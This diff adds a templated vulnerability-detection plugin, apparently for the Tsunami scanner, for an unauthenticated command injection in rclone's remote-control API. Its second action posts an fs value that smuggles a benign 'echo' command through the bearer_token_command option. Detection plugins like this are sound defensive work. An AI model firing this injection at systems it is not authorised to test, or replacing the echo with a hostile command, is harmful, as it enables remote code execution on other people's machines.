@@ -1,0 +1,89 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "RClone_CVE_2026_41179"
+  author: "dyeddala"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE-2026-41179"
+  }
+  severity: CRITICAL
+  title: "RClone RC - Command Injection"
+  description: "Rclone >= 1.48.0 and < 1.73.5 contains an unauthenticated local command execution caused by unauthenticated access to the RC endpoint operations/fsinfo with attacker-controlled fs input, letting unauthenticated attackers execute local commands, exploit requires reachable RC deployment without global HTTP authentication."
+  recommendation: "Update to version 1.73.5 or later."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2026-41179"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprint_rclone_rc"
+  http_request: {
+    method: POST
+    uri: "/rc/noop"
+    headers: [
+      {
+        name: "Content-Type"
+        value: "application/json"
+      }
+    ]
+    data: "{}"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "{}" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "rclone_fsinfo_check"
+  http_request: {
+    method: POST
+    uri: "/operations/fsinfo"
+    headers: [
+      {
+        name: "Content-Type"
+        value: "application/json"
+      }
+    ]
+    data: "{\"fs\":\":webdav,url='http://example.com/',vendor=other,bearer_token_command='echo tsunami_check':\"}"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "Features" }
+        ]
+      }
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  actions: "fingerprint_rclone_rc"
+  actions: "rclone_fsinfo_check"
+}
